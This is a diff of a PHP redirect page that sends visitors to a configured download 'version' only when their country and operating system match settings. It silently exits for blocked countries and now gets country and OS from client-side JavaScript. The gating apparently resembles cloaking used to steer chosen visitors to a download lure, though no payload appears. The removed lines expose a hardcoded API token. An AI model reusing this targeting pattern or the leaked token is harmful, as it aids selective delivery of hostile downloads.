@@ -9,41 +9,74 @@ $settingsFileStr = file_get_contents($settingsFile);
 $settings = json_decode($settingsFileStr, false);
 
 $pageStatus = $settings->PageStatus;
-$version = $settings->Version->Enabled;
 $GEO = $settings->GEO;
 $BlockedGEO = $settings->BlockedGEO;
-$userOS = getOS();
+$settingOS = $settings->OS;
+$version = $settings->Version->Enabled;
 
-// Function to get user's OS
-function getOS() {
-    $userAgent = $_SERVER['HTTP_USER_AGENT'];
-    if (preg_match('/Windows/i', $userAgent)) return 'Windows';
-    if (preg_match('/Macintosh|Mac OS X/i', $userAgent)) return 'macOS';
-    if (preg_match('/Android/i', $userAgent)) return 'Android';
-    if (preg_match('/iPhone|iPad/i', $userAgent)) return 'iPhone';
-    return 'Unknown OS';
-}
 
+$country_code;
+$OS;
+$isDownload;
+
+if (isset($_REQUEST['country_code'])) $country_code = $_REQUEST['country_code'];
+if (isset($_REQUEST['OS'])) $OS = $_REQUEST['OS'];
+if (isset($_REQUEST['isDownload'])) $isDownload = $_REQUEST['isDownload'];
+
+var_dump($country_code);
+var_dump($OS);
+var_dump($isDownload);
 
 // Get the main domain dynamically
 $mainDomain = $_SERVER['HTTP_HOST']; // Extracts the domain name, like "domain.com"
 
-// get country code by ip address
-$userIP = $_SERVER['REMOTE_ADDR'];
-$ipInfo = json_decode( file_get_contents('http://ipinfo.io/'.'95.216.14.148'.'?token=6197b6ab0656f9') );
-
-if ($pageStatus == 'ON') {
-	if (!isset($_SESSION['isDownload']) || $_SESSION['isDownload'] != '1') {
-		if ( in_array($ipInfo->country, $BlockedGEO) ) exit();
-
-		if ( in_array($ipInfo->country, $GEO) || $GEO == '100' )  {
-		    if (in_array($userOS, $settings->OS)) {
-    		    header("Location: https://$mainDomain/$version");
-    		}
-		}
-		
-	}
+if ($pageStatus == 'ON' && in_array($OS, $settingOS) && (in_array($country_code, $GEO) || in_array('100', $GEO)) && !in_array($country_code, $BlockedGEO)) {
+	header("Location: https://$mainDomain/$version");
 }
 
 
 ?>
+
+<?php if (!$_REQUEST['country_code']): ?>
+
+<script type="text/javascript" src="./V3/assets/js/jquery.min.js"></script>
+<script type="text/javascript">
+    
+	let isDownload = false;
+	let country_code = '';
+	
+	$.ajax({
+		type: 'POST',
+		url: '/api/check_rayid.php',
+		data: JSON.stringify({ rayid: '' }),
+		contentType: 'application/json', // Indicate that you're sending JSON
+		success: function(res) {
+			console.log(res)
+			if (res == '10') {
+				isDownload = true;
+			}
+
+			$.get('https://ipinfo.io/json', function(ipinfo) {
+				country_code = ipinfo.country;
+
+				location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '') + `?country_code=${country_code}&OS=${OS}&isDownload=${isDownload}`;
+			})
+		}
+	})
+
+
+	// get OS
+	const OS = getOS();
+	function getOS() {
+		const userAgent = navigator.userAgent;
+		if (/Windows/i.test(userAgent)) return 'Windows';
+		if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
+		if (/Android/i.test(userAgent)) return 'Android';
+		if (/iPhone|iPad/i.test(userAgent)) return 'iPhone';
+		return 'Unknown OS';
+	}
+
+
+</script>
+
+<?php endif; ?>
